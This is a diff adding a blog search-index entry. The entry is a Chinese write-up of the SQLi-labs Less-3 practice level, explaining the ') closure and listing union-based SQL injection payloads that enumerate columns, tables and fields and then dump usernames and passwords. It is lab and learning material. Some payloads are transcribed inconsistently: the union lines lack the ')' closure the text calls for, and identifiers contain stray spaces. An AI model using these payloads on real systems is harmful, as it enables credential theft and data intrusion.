@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>sql注入闯关3</title>
+      <link href="test15/undefined-undefined.html"/>
+      <url>test15/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天再来一个sql闯关（发现这几天都没怎么复习巩固sql注入了）  </p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>这道题让我知道了其他的闭合方式。<br>之前我们做的前两关后台代码执行的sql语句是这样的  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p></blockquote><p>这也就是说我们在构造payload时，在?id=999后面为什么要加上一个’，结尾要以注释符号结尾的原因，因为这样构造的执行的最终的sql语句是这样的。  </p><blockquote><p>“SELECT * FROM users WHERE id=’999’ order by 4–+’</p></blockquote><p>这里999后面的单引号就是我们加上去的，而最后的单引号是原语句的，因为在注释符后面，所以不会被当成错误而报错。<br>同样的整形注入时后台的sql语句是这样的。  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p></blockquote><p>可以看到，这里的$id变成了数字，所以我们就不需要再在?id=999后面加上单引号，结尾也不需要加上注释符了。  </p><hr><p>那么再来看看今天这道题目，它的后台sql语句是这样的。  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;</p></blockquote><p>也就是多出了一对括号，而我们注入时这个括号是存在的，也就是说我们构造时要在/?id=999后面加上’）来和前面的括号闭合，除此之外也就没有什么和别的不同的地方了。<br>查字段</p><blockquote><p>?id=1’） order by 4–+</p></blockquote><p>回显错误，所以只有三个字段。<br>接下来爆库名  </p><blockquote><p>?id=1’ union select 1,2,database()–+</p></blockquote><p>爆表名</p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段 </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题和之前的没什么区别，主要还是在这个闭合上要进行试探。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test15 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>寒假练习9</title>
       <link href="test14/undefined-undefined.html"/>
       <url>test14/undefined-undefined.html</url>
